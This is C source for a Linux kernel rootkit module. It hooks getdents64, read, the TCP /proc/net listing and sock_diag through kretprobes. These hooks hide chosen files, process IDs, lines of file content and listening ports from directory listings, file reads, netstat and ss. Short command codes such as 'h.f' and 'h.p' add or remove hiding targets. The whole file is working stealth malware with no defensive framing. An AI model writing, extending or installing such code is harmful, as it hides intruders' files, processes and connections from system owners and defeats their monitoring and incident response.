// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#ifndef SEQ_START_TOKEN
#define SEQ_START_TOKEN ((void *)1)
#endif

/* Getdents64 filter (files and PIDs) */

struct getdents_data {
	void __user *ubuf;
	int fd;
};

static bool should_hide_dirent(const char *name)
{
	return rk_target_prefix_match(&rk_file_targets, name) ||
	       rk_target_match(&rk_pid_targets, name);
}

static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_data *data;
	struct pt_regs *uregs;

	data = (struct getdents_data *)ri->data;
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 1;
	data->fd = (int)uregs->di;
	data->ubuf = (void __user *)uregs->si;
	return 0;
}

static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_data *data;
	struct linux_dirent64 *d;
	long total, off, new_total;
	char *kbuf;

	data = (struct getdents_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_total = total;
	while (off < new_total) {
		unsigned short reclen;

		d = (struct linux_dirent64 *)(kbuf + off);
		reclen = d->d_reclen;
		if (reclen < offsetof(struct linux_dirent64, d_name) + 1 ||
		    reclen > new_total - off ||
		    !memchr(d->d_name, '\0',
			    reclen - offsetof(struct linux_dirent64, d_name))) {
			kfree(kbuf);
			return 0;
		}
		if (should_hide_dirent(d->d_name)) {
			long remaining = new_total - off - reclen;

			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + reclen,
					remaining);
			new_total -= reclen;
		} else {
			off += reclen;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

struct kretprobe rk_getdents_probe = {
    .handler = getdents_return,
    .entry_handler = getdents_entry,
    .data_size = sizeof(struct getdents_data),
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

/* Read filter (content lines) */

struct read_data {
	void __user *ubuf;
	size_t count;
	unsigned int fd;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;

	data = (struct read_data *)ri->data;
	data->fd = (unsigned int)regs->di;
	data->ubuf = (void __user *)regs->si;
	data->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;
	struct file *file;
	umode_t mode;
	long total, new_total;
	char *kbuf, *pos;

	data = (struct read_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	/* Never rewrite terminal, socket, or pipe streams. Apart from breaking
	 * interactive I/O, returning a shortened protocol frame corrupts it. */
	file = fget(data->fd);
	if (!file)
		return 0;
	mode = file_inode(file)->i_mode;
	if (!S_ISREG(mode) || (mode & 0111)) {
		fput(file);
		return 0;
	}
	fput(file);

	kbuf = kvmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kvfree(kbuf);
		return 0;
	}

	pos = kbuf;
	new_total = total;

	while (pos < kbuf + new_total) {
		char *nl;
		int line_len;

		nl = memchr(pos, '\n', (kbuf + new_total) - pos);
		if (nl)
			line_len = nl - pos + 1;
		else
			line_len = (kbuf + new_total) - pos;

		if (rk_line_matches(&rk_content_targets, pos, line_len)) {
			long remaining;

			remaining = (kbuf + new_total) - (pos + line_len);
			if (remaining > 0)
				memmove(pos, pos + line_len, remaining);
			new_total -= line_len;
		} else {
			pos += line_len;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kvfree(kbuf);
	return 0;
}

struct kretprobe rk_read_probe = {
    .handler = read_return,
    .entry_handler = read_entry,
    .data_size = sizeof(struct read_data),
    .maxactive = 20,
    .kp.symbol_name = "ksys_read",
};

/* TCP seq_show filter (ports) */

struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_show_data *data;

	data = (struct tcp_show_data *)ri->data;
	data->seq = (struct seq_file *)regs->di;
	data->saved_count = data->seq->count;
	data->sk = (struct sock *)regs->si;
	return 0;
}

static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_show_data *data;
	struct inet_sock *inet;
	unsigned short sport;
	char port_str[8];

	data = (struct tcp_show_data *)ri->data;

	if (data->sk == SEQ_START_TOKEN)
		return 0;

	inet = inet_sk(data->sk);
	sport = ntohs(inet->inet_sport);
	snprintf(port_str, sizeof(port_str), "%u", sport);

	if (rk_target_match(&rk_port_targets, port_str))
		data->seq->count = data->saved_count;

	return 0;
}

struct kretprobe rk_tcp4_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

struct kretprobe rk_tcp6_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp6_seq_show",
};

/* sock_diag filter (ss/iproute2) */

struct inet_diag_data {
	struct sk_buff *skb;
	unsigned int saved_len;
	bool hide;
};

static int inet_diag_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct inet_diag_data *data = (struct inet_diag_data *)ri->data;
	struct inet_sock *inet = inet_sk((struct sock *)regs->di);
	char port_str[8];

	data->skb = (struct sk_buff *)regs->dx;
	data->saved_len = data->skb->len;
	snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_sport));
	data->hide = rk_target_match(&rk_port_targets, port_str);
	return 0;
}

static int inet_diag_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct inet_diag_data *data = (struct inet_diag_data *)ri->data;

	if (data->hide && regs_return_value(regs) == 0 &&
	    data->skb->len > data->saved_len)
		skb_trim(data->skb, data->saved_len);
	return 0;
}

struct kretprobe rk_inet_diag_probe = {
	.handler = inet_diag_return,
	.entry_handler = inet_diag_entry,
	.data_size = sizeof(struct inet_diag_data),
	.maxactive = 64,
	.kp.symbol_name = "inet_sk_diag_fill",
};

/* Command handlers */

static int cmd_hide_file(const char *arg) { return rk_target_add(&rk_file_targets, arg); }
static int cmd_hide_pid(const char *arg) { return rk_target_add(&rk_pid_targets, arg); }
static int cmd_hide_content(const char *arg) { return rk_target_add(&rk_content_targets, arg); }
static int cmd_hide_port(const char *arg) { return rk_target_add(&rk_port_targets, arg); }

static int cmd_unhide_file(const char *arg) { return rk_target_unhide(&rk_file_targets, arg); }
static int cmd_unhide_pid(const char *arg) { return rk_target_unhide(&rk_pid_targets, arg); }
static int cmd_unhide_content(const char *arg) { return rk_target_unhide(&rk_content_targets, arg); }
static int cmd_unhide_port(const char *arg) { return rk_target_unhide(&rk_port_targets, arg); }

static const struct rk_cmd_entry filter_cmds[] = {
	{ "h.f", cmd_hide_file },      { "u.f", cmd_unhide_file },
	{ "h.i", cmd_hide_pid },       { "u.i", cmd_unhide_pid },
	{ "h.c", cmd_hide_content },   { "u.c", cmd_unhide_content },
	{ "h.p", cmd_hide_port },      { "u.p", cmd_unhide_port },
};

int rk_filter_init(void)
{
	return rk_cmds_register(filter_cmds, ARRAY_SIZE(filter_cmds));
}
